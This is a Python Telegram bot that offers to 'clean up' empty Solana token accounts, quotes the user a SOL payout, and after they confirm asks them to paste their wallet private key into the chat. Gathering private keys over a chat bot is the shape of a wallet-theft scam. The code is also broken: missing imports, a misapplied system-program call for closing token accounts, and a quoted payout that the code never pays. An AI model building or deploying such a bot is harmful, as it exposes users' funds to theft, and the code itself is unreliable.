import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import base64
import logging
from solders.system_program import SystemProgram
from solders.transaction import Transaction
from solders.keypair import Keypair
from solders.pubkey import Pubkey

logging.basicConfig(level=logging.INFO)

# تعديل المتغير ليكون TELEGRAM_BOT_TOKEN
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')  # استخدام البيئة لقراءة التوكن
ADMIN_ID = 5053683608
RPC_URL = "https://api.mainnet-beta.solana.com"
bot = telebot.TeleBot(BOT_TOKEN)

user_wallets = {}
user_states = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        user_states[message.chat.id] = None
        welcome_text = "Welcome 👋\n\nSend me the wallet address you want to check 🔍"
        bot.reply_to(message, welcome_text)
    except Exception as e:
        logging.error(f"/start error: {e}")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) is None)
def handle_wallet(message):
    try:
        wallet = message.text.strip()
        if not (32 <= len(wallet) <= 44):
            bot.reply_to(message, "❗ Invalid address, try again.")
            return

        solana_api = "https://api.mainnet-beta.solana.com"
        headers = {"Content-Type": "application/json"}
        data = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getTokenAccountsByOwner",
            "params": [
                wallet,
                {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
                {"encoding": "jsonParsed"}
            ]
        }

        response = requests.post(solana_api, json=data, headers=headers)
        response.raise_for_status()

        result = response.json()
        if "result" not in result or "value" not in result["result"]:
            bot.reply_to(message, "❗ Unexpected response. Try again later.")
            return

        accounts = result["result"]["value"]
        token_accounts = 0
        nft_accounts = 0
        cleanup_accounts = 0
        total_rent = 0

        for acc in accounts:
            try:
                info = acc["account"]["data"]["parsed"]["info"]
                amount = info["tokenAmount"]["uiAmount"]
                decimals = info["tokenAmount"]["decimals"]

                if amount == 0:
                    token_accounts += 1
                elif decimals == 0 and amount == 1:
                    nft_accounts += 1
                else:
                    cleanup_accounts += 1

                total_rent += 0.00203928
            except Exception as e:
                logging.warning(f"Error processing account: {e}")
                continue

        real_value = total_rent
        sol_value = round(real_value / 3, 5)
        short_wallet = wallet[:4] + "..." + wallet[-4:]

        if sol_value < 0.01:
            bot.send_message(
                message.chat.id,
                "🚫 Unfortunately, we cannot offer any value for this wallet.\n\n"
                "🔍 Try checking other addresses—some might be valuable!"
            )
            return

        user_wallets[message.chat.id] = {
            "original_wallet": wallet,
            "amount": real_value,
            "accounts": [acc["pubkey"] for acc in accounts]
        }

        result_text = (
            f"Wallet: `{short_wallet}`\n\n"
            f"You will receive: `{sol_value} SOL` 💰"
        )

        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ Confirm", callback_data="confirm"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel")
        )

        bot.send_message(message.chat.id, result_text, reply_markup=markup)

    except Exception as e:
        logging.error(f"Error handling wallet: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "confirm")
def handle_confirm(call):
    try:
        bot.send_message(call.message.chat.id, "🔒 Please send your private key to proceed.")
        user_states[call.message.chat.id] = "waiting_for_private_key"
    except Exception as e:
        logging.error(f"Error handling confirm: {e}")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "waiting_for_private_key")
def handle_private_key(message):
    try:
        private_key = message.text.strip()

        # Convert private key to Keypair (assuming it's in base58 format)
        keypair = Keypair.from_secret_key(base58.b58decode(private_key))

        # Perform cleanup and close token accounts
        perform_cleanup(keypair, message.chat.id)

    except Exception as e:
        logging.error(f"Error processing private key: {e}")
        bot.send_message(message.chat.id, "❌ Invalid private key. Please try again.")

def perform_cleanup(keypair: Keypair, chat_id: int):
    try:
        accounts = user_wallets[chat_id]["accounts"]
        destination = keypair.pubkey()
        instructions = []

        for acc in accounts:
            acc_pubkey = Pubkey.from_string(acc)
            ix = SystemProgram.close_account(
                account=acc_pubkey,
                destination=destination,
                owner=destination
            )
            instructions.append(ix)

        if not instructions:
            bot.send_message(chat_id, "No empty accounts to close.")
            return

        transaction = Transaction()
        transaction.add(*instructions)

        # Sign transaction
        transaction.sign([keypair])

        # Send transaction
        raw_tx = base64.b64encode(transaction.serialize()).decode("utf-8")
        send_data = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "sendTransaction",
            "params": [raw_tx, {"skipPreflight": False}]
        }

        response = requests.post(RPC_URL, json=send_data)
        result = response.json()
        if "result" in result:
            bot.send_message(chat_id, f"✅ Cleanup complete!\nTransaction: `{result['result']}`", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, f"❌ Transaction failed:\n{result}", parse_mode='Markdown')
    except Exception as e:
        logging.error(e)
        bot.send_message(chat_id, "❌ Failed to send transaction.")

bot.polling()
